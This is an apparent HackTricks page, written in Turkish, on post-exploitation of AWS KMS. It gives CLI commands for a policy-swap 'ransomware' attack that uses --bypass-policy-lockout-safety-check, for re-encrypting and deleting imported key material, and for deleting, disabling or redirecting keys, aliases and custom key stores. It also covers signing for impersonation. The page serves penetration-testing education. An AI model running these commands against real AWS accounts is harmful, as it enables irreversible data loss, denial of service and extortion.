# AWS - KMS Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## KMS

Daha fazla bilgi için bakınız:

{{#ref}}
../../aws-services/aws-kms-enum.md
{{#endref}}

### Şifreleme/Şifre çözme bilgileri

`fileb://` ve `file://` yerel dosyaların yolunu belirtmek için AWS CLI komutlarında kullanılan URI şemalarıdır:

- `fileb://:` dosyayı binary (ikili) modda okur; genellikle metin olmayan dosyalar için kullanılır.
- `file://:` dosyayı metin modunda okur; tipik olarak düz metin dosyaları, scriptler veya özel kodlama gerektirmeyen JSON için kullanılır.

> [!TIP]
> Bir dosyanın içindeki veriyi şifre çözmek istiyorsanız, dosyanın base64 ile kodlanmış veri değil, binary veri içermesi gerektiğini unutmayın. (fileb://)

- **Simetrik** bir anahtar kullanarak
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
- Bir **asymmetric** key kullanarak:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMS Ransomware

KMS üzerinde ayrıcalıklı erişime sahip bir saldırgan, anahtarların KMS politikasını değiştirip **kendi hesabına bu anahtarlara erişim verebilir**, meşru hesaba tanınan erişimi kaldırarak.

Böylece, meşru hesap kullanıcıları bu anahtarlarla şifrelenmiş herhangi bir servisin hiçbir bilgisine erişemeyecek; bu, hesap üzerinde kolay ama etkili bir ransomware yaratır.

> [!WARNING]
> Bu saldırıdan **AWS managed keys etkilenmez**, yalnızca **Customer managed keys** etkilenir.

> Ayrıca param **`--bypass-policy-lockout-safety-check`** kullanımının gerektiğini not edin (web konsolunda bu seçeneğin olmaması saldırıyı yalnızca CLI üzerinden mümkün kılar).
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
> [!CAUTION]
> Eğer bu policy'yi değiştirip sadece bir external account'a erişim verirseniz ve daha sonra bu external account'tan original account'a erişimi geri vermek için yeni bir policy ayarlamaya çalışırsanız, bunu yapamazsınız çünkü Put Polocy action cross account'tan gerçekleştirilemez.

<figure><img src="../../../images/image (77).png" alt=""><figcaption></figcaption></figure>

### Generic KMS Ransomware

Küresel KMS Ransomware gerçekleştirmek için başka bir yol daha vardır; bu şu adımları içerir:

- Saldırgan tarafından içeri aktarılan bir **key with a key material** oluşturun
- **Re-encrypt older data**: Önceki sürümle şifrelenmiş kurban verilerini yeni anahtarla yeniden şifreleyin.
- **Delete the KMS key**
- Şimdi şifrelenmiş verileri çözebilecek tek kişi, original key material'e sahip saldırgandır

### kms:DeleteImportedKeyMaterial ile Anahtarları Silme

`kms:DeleteImportedKeyMaterial` izniyle bir aktör, `Origin=EXTERNAL` olan CMK'lardan imported key material'i silebilir (key material'lerini içeri aktarmış CMK'lar), böylece bunlar veriyi çözemeyecek hale gelir. Bu eylem, compatible material yeniden re-imported edilmedikçe yıkıcı ve geri döndürülemezdir; bir saldırganın şifrelenmiş bilgileri kalıcı olarak erişilemez hale getirerek etkili biçimde ransomware-like veri kaybına yol açmasına olanak tanır.
```bash
aws kms delete-imported-key-material --key-id <Key_ID>
```
### Anahtarları yok etme

Anahtarları yok ederek DoS gerçekleştirilebilir.
```bash
# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
> [!CAUTION]
> AWS'ın artık **önceki işlemlerin hesaplar arası olarak gerçekleştirilmesini engellediğini** unutmayın:

### Alias'ı Değiştirme veya Silme
Bu saldırı AWS KMS alias'larını siler veya yönlendirir, anahtar çözümlemesini bozar ve bu alias'lara bağlı hizmetlerde derhal arızalara yol açar; sonucunda denial-of-service meydana gelebilir. `kms:DeleteAlias` veya `kms:UpdateAlias` gibi izinlerle bir saldırgan alias'ları kaldırabilir veya yeniden yönlendirebilir ve kriptografik işlemleri (ör. encrypt, describe) bozabilir. Anahtar ID'si yerine alias'ı referans alan herhangi bir servis, alias geri yüklenene veya doğru şekilde yeniden eşlenene kadar başarısız olabilir.
```bash
# Delete Alias
aws kms delete-alias --alias-name alias/<key_alias>

# Update Alias
aws kms update-alias \
--alias-name alias/<key_alias> \
--target-key-id <new_target_key>
```
### Cancel Key Deletion
Bu tür izinlere (`kms:CancelKeyDeletion` ve `kms:EnableKey`) sahip bir aktör, bir AWS KMS customer master key için planlanmış silmeyi iptal edebilir ve daha sonra yeniden etkinleştirebilir. Bu işlem anahtarı kurtarır (başlangıçta Disabled durumunda) ve daha önce korunan verileri decrypt etme yeteneğini geri yükleyerek exfiltration'a olanak sağlar.
```bash
# Firts cancel de deletion
aws kms cancel-key-deletion \
--key-id <Key_ID>

## Second enable the key
aws kms enable-key \
--key-id <Key_ID>
```
### Anahtarı Devre Dışı Bırak

`kms:DisableKey` izni ile bir aktör, bir AWS KMS customer master key'i devre dışı bırakabilir; bu, anahtarın şifreleme veya şifre çözme için kullanılmasını engeller. Bu, o CMK'ye bağlı hizmetlerin erişimini keser ve anahtar yeniden etkinleştirilmeyene kadar anında kesintilere veya denial-of-service'e yol açabilir.
```bash
aws kms disable-key \
--key-id <key_id>
```
### Derive Shared Secret
`kms:DeriveSharedSecret` izniyle, bir actor KMS'de tutulan private key ile kullanıcı tarafından sağlanan public key'i kullanarak ECDH paylaşılan gizli anahtarını hesaplayabilir.
```bash
aws kms derive-shared-secret \
--key-id <key_id> \
--public-key fileb:///<route_to_public_key> \
--key-agreement-algorithm <algorithm>
```
### Impersonation via kms:Sign
`kms:Sign` izniyle, bir aktör KMS'de saklanan bir CMK'yı private key'i ifşa etmeden verileri kriptografik olarak imzalamak için kullanabilir; bu, impersonation'a olanak tanıyabilecek veya kötü amaçlı eylemleri yetkilendirebilecek geçerli signatures üretir.
```bash
aws kms sign \
--key-id <key-id> \
--message fileb://<ruta-al-archivo> \
--signing-algorithm <algoritmo> \
--message-type RAW
```
### DoS with Custom Key Stores
`kms:DeleteCustomKeyStore`, `kms:DisconnectCustomKeyStore` veya `kms:UpdateCustomKeyStore` gibi izinlere sahip bir aktör, bir AWS KMS Custom Key Store (CKS) üzerinde değişiklik yapabilir, bağlantısını kesebilir veya silebilir; bu da master anahtarlarının çalışmaz hale gelmesine yol açar. Bu, bu anahtarlara bağlı hizmetlerde şifreleme, şifre çözme ve imzalama işlemlerini bozar ve anında bir denial-of-service'e neden olabilir. Bu nedenle, bu izinlerin kısıtlanması ve izlenmesi kritik öneme sahiptir.
```bash
aws kms delete-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms disconnect-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms update-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID> --new-custom-key-store-name <NEW_NAME> --key-store-password <NEW_PASSWORD>
```
<figure><img src="../../../images/image (76).png" alt=""><figcaption></figcaption></figure>

{{#include ../../../../banners/hacktricks-training.md}}
